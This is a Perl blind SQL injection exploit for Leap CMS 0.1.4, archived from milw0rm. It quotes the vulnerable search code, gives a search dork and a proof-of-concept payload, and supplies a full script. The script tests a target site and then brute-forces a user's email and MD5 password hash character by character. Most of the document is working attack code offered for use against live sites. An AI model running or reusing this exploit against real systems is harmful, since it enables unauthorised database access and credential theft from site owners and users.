<html><head><title>Leap CMS 0.1.4 (searchterm)  Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
#**					  ¡PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#----------------------------------------------------------------------------------------------
#|       	    (Search Post Form) BLIND SQL INJECTION (BSQLi) EXPLOIT	              |
#|--------------------------------------------------------------------------------------------|
#|                         	    |   Leap CMS 0.1.4    |		 	              |
#|  CMS INFORMATION:		     ---------------------				      |
#|										              |
#|--&gt;WEB: http://leap.gowondesigns.com/				   		              |
#|--&gt;DOWNLOAD: http://leap.gowondesigns.com/download.php?leap014.zip		              |
#|--&gt;DEMO: http://php.opensourcecms.com/scripts/details.php?scriptid=161&amp;name=Leap	      |
#|--&gt;CATEGORY: CMS / Lite								      |
#|--&gt;DESCRIPTION: Leap is a single file, template independent, open-source,                   |
#| 		standards-compliant,extensible content management system for the web...	      |
#|--&gt;RELEASED: 2009-03-13								      |
#|											      |
#|  CMS VULNERABILITY:									      |
#|											      |
#|--&gt;TESTED ON: firefox 3                                				      |
#|--&gt;DORK: &quot;Powered by Leap&quot;								      |
#|--&gt;CATEGORY: BLIND SQL INJECTION/ PERL EXPLOIT					      |
#|--&gt;AFFECT VERSION: LAST = 0.1.4 (Maybe &lt;= ?)		            			      |
#|--&gt;Discovered Bug date: 2009-04-25							      |
#|--&gt;Reported Bug date: 2009-04-25							      |
#|--&gt;Fixed bug date: Not fixed								      |
#|--&gt;Info patch (????): Not fixed							      |   
#|--&gt;Author: YEnH4ckEr									      |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							      |
#|--&gt;WEB/BLOG: N/A									      |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		      |
#----------------------------------------------------------------------------------------------
#
#-----------
#BUG FILE:
#-----------
#
#Path --&gt; [HOME_PATH]/leap.php
#
#
#
#function contentSearch() {
#
#	...
#
#
#if($searchterm=='') return FALSE;
#
#        ...
#	
#	if (eregi(&quot; AND | NOT | OR &quot;,$search,$matches)) $search=str_replace($matches,'',$search);   &lt;-------BYPASSED (/**/)
#		
#		$keywords = explode(' ', $search); //print_r($keywords);    &lt;---------BYPASSED (/**/)
#		
#		...
#		
#		$query = &quot;SELECT * FROM &quot;.db('prefix').&quot;content WHERE published='1' AND&quot;;     &lt;----------START QUERY
#
#		if ($keyCount &gt; 1) {
#
#			...
#		
#		}
#		else {
#
#			$query .=&quot; (INSTR(`title`, '$keywords[0]') &gt; '0' || INSTR(`body`, '$keywords[0]') &gt; '0' || ...)&quot;;}  &lt;--------INJECTION HERE
#			$pquery=$query.';'; $query.=&quot; ORDER BY mod_date DESC LIMIT $pg, $max;&quot;; //echo $query;
#		
#			...
#
#		}
#
#}
#
#------------
#CONDITIONS:
#------------
#
#**gpc_magic_quotes=off
#
#---------------------------------------
#PROOF OF CONCEPT (BLIND SQL INJECTION):
#---------------------------------------
#
#SEARCH --&gt; a')&gt;'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/1=1#
#
#Return: Search for 'a'
#
#######################################################################
#######################################################################
##*******************************************************************##
## ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
##*******************************************************************##
##-------------------------------------------------------------------##
##*******************************************************************##
##       GREETZ TO: JosS and all SPANISH Hack3Rs community!          ##
##*******************************************************************##
#######################################################################
#######################################################################
#
use LWP::UserAgent;
use HTTP::Request;
#Subroutines
sub lw
{
	my $SO = $^O;
	my $linux = &quot;&quot;;
	if (index(lc($SO),&quot;win&quot;)!=-1){
		$linux=&quot;0&quot;;
	}else{
		$linux=&quot;1&quot;;
	}		
	if($linux){
		system(&quot;clear&quot;);
	}
	else{
		system(&quot;cls&quot;);
		system (&quot;title Leap CMS 0.1.4 (BLIND SQL Injection) Exploit&quot;);
		system (&quot;color 04&quot;);
	}
}
sub request {
	my $userag = LWP::UserAgent-&gt;new;
	$userag -&gt; agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
	my $request = HTTP::Request -&gt; new(POST =&gt; $_[0]);
	$request-&gt;content_type('application/x-www-form-urlencoded');
	$request-&gt;content($_[1]); 
	my $outcode= $userag-&gt;request($request)-&gt;as_string;
	return $outcode;
}
sub helper {
	print &quot;\n\t[&lt;--&gt;] Leap CMS 0.1.4 - (BLIND SQL Injection) Exploit\n&quot;;
	print &quot;\t[&lt;--&gt;] USAGE MODE: [&lt;--&gt;]\n&quot;;
	print &quot;\t[&lt;--&gt;] perl $0 [HOST] [PATH] [Search] [Id]\n&quot;;
	print &quot;\t[&lt;--&gt;] [HOST]: Web.\n&quot;;
	print &quot;\t[&lt;--&gt;] [PATH]: Home Path.\n&quot;;
	print &quot;\t[&lt;--&gt;] [Search]: Something. Default: a (**optional)\n&quot;;
	print &quot;\t[&lt;--&gt;] [id]: Id user. Default: 1 (**optional)\n&quot;;
	print &quot;\t[&lt;--&gt;] Example: perl $0 'www.example.es' 'leap-CMS' 'a' '1'\n&quot;; 
}
sub lengthuser{
#First, user length...
$exit=0;
$i=0;
	while($exit==0){
		my $searchinjected=&quot;searchterm=&quot;.$_[2].&quot;')&gt;'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/(SELECT/*y3nh4ck3r*/length(mail)/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id=&quot;.$_[1].&quot;)=&quot;.$i++.&quot;#&quot;; #injected code
		$output=&amp;request($_[0],$searchinjected);
		if ( $output =~ (/No Results Found./))
		{
			$exit=0;
		}else{
			$exit=1;
		}
	}
#Save column length
$lengthuser=$i-1;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tUser Length catched!\n&quot;;
print &quot;\tUser Length: &quot;.$lengthuser.&quot;\n&quot;;
print &quot;\tBruteforcing values...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
return $lengthuser;
}
sub bruteforcing {
my $values=&quot;&quot;;
#Getting datas
$j=1;
	$i=46;
	while(($j&lt;=$_[2]) &amp;&amp; ($i&lt;=126)){
		my $searchinjected=&quot;searchterm=&quot;.$_[4].&quot;')&gt;'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/ascii(substring((SELECT/*y3nh4ck3r*/&quot;.$_[3].&quot;/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id='&quot;.$_[1].&quot;'),&quot;.$j.&quot;,1))=&quot;.$i.&quot;#&quot;; #injected code
		$output=&amp;request($_[0],$searchinjected);
		if ( $output !~ (/No Results Found./))
		{
			$values=$values.chr($i);
			$j++;
			$i=45;
		}
	if($i==57)
	{
		$i=63; #@
	}
	if($i==64)
	{
		$i=96;
	}
#new char
	$i++; 
	}
#Error
	if(($i&gt;127) || ($j&gt;$_[2])){
		if(!$values){
			print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
			print &quot;\tEXPLOIT FAILED!\n&quot;;
			print &quot;\tFatal error: Datas doesn't find!\n&quot;;
			print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
			print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
			exit(1);
		}
	}
	
return $values;
}
#Main
&amp;lw;
print &quot;\t\t#######################################################\n\n&quot;;
print &quot;\t\t#######################################################\n\n&quot;;
print &quot;\t\t##   Leap CMS 0.1.4 - (BLIND SQL Injection) Exploit  ##\n\n&quot;;
print &quot;\t\t##       ++Conditions: Need magic_quotes=off         ##\n\n&quot;;
print &quot;\t\t##                  Author: Y3nh4ck3r                ##\n\n&quot;;
print &quot;\t\t##          Contact:y3nh4ck3r[at]gmail[dot]com       ##\n\n&quot;;
print &quot;\t\t##                  Proud to be Spanish!             ##\n\n&quot;;
print &quot;\t\t#######################################################\n\n&quot;;
print &quot;\t\t#######################################################\n\n&quot;;
#Init variables
my $host=$ARGV[0];
my $path=$ARGV[1];
#Build the uri
my $finalhost=&quot;http://&quot;.$host.&quot;/&quot;.$path.&quot;/index.php?search&quot;;
#Check all variables needed
$numArgs = $#ARGV + 1;
	if($numArgs&lt;=1) 
	{
		&amp;helper;
		exit(1);	
	}
#Search parameter. It's optional. Default:a
	if(!$ARGV[2]){
		$search=&quot;a&quot;;	
	}else{
		$search=$ARGV[2];	
	}
#Id-user is optional.Default:1
	if(!$ARGV[3]){
		$idhacked=&quot;1&quot;;	
	}else{
		$idhacked=$ARGV[3];	
	}
#Testing blind sql injection
my $finalrequest = $finalhost;	
#Test blind sql injection
my $searchinjected=&quot;searchterm=&quot;.$search.&quot;')&gt;'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/1=1#&quot;; #injected code
$output=&amp;request($finalrequest, $searchinjected);
if ( $output =~ (/No Results Found./))
{   
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tThis Web is not vulnerable!\n&quot;;
	print &quot;\t---&gt;Maybe:\n&quot;;
	print &quot;\t1.-Patched or gpc_magic_quotes=off\n&quot;;
	print &quot;\t2.-Search parameter hasn't found. Try other!\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1);
}else{ 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tWeb is vulnerable!\n&quot;;
	print &quot;\tTested Blind SQL Injection.\n&quot;;		
	print &quot;\tChecking id user...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
 
}	
#Test if user exists
my $searchinjected=&quot;searchterm=&quot;.$search.&quot;')&gt;'1')/*y3nh4ck3r*/AND/*y3nh4ck3r*/(SELECT/*y3nh4ck3r*/COUNT(*)/*y3nh4ck3r*/FROM/*y3nh4ck3r*/users/*y3nh4ck3r*/WHERE/*y3nh4ck3r*/id='&quot;.$idhacked.&quot;')#&quot;; #injected code
$output=&amp;request($$finalrequest,$searchinjected);
if ( $output =~ (/No Results Found./))
{    
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tUser doesn't exists!\n&quot;;		
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1); 
}else{ 

	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tOK...The user exists!\n&quot;;		
	print &quot;\tStarting exploit...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tWait several minutes...\n&quot;; 
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
}	
#Bruteforcing user...
$length_mail=&amp;lengthuser($finalrequest,$idhacked,$search);
$email=&amp;bruteforcing($finalrequest,$idhacked,$length_mail,'mail',$search);
if(length($email)!=$length_mail)
{
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	print &quot;\tEXPLOIT FAILED!\n&quot;;
	print &quot;\tFatal error: Different length email!\n&quot;;
	print &quot;\tCause: Maybe you have to include more characters on bruteforcing...\n&quot;;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
	exit(1);
}

print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
print &quot;\tGot user!\n&quot;;
print &quot;\tBruteforcing password hash (md5)...\n&quot;;
print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;;
#Bruteforcing password...
$passhash=&amp;bruteforcing($finalrequest,$idhacked,32,'pwd',$search); #it isn't needed length
print &quot;\n\t\t*************************************************\n&quot;;
print &quot;\t\t****  EXPLOIT EXECUTED (LeapCMS 0.1.4 BSQLi) ****\n&quot;;
print &quot;\t\t*************************************************\n\n&quot;;
print &quot;\t\tUser-id:&quot;.$idhacked.&quot;\n&quot;;
print &quot;\t\tE-mail:&quot;.$email.&quot;\n&quot;;
print &quot;\t\tUser-password(hash):&quot;.$passhash.&quot;\n\n&quot;;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3hn4ck3r--------------&gt;&gt;\n\n&quot;;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;;
exit(1);
#Ok...all job done

# milw0rm.com [2009-04-30]</pre></html>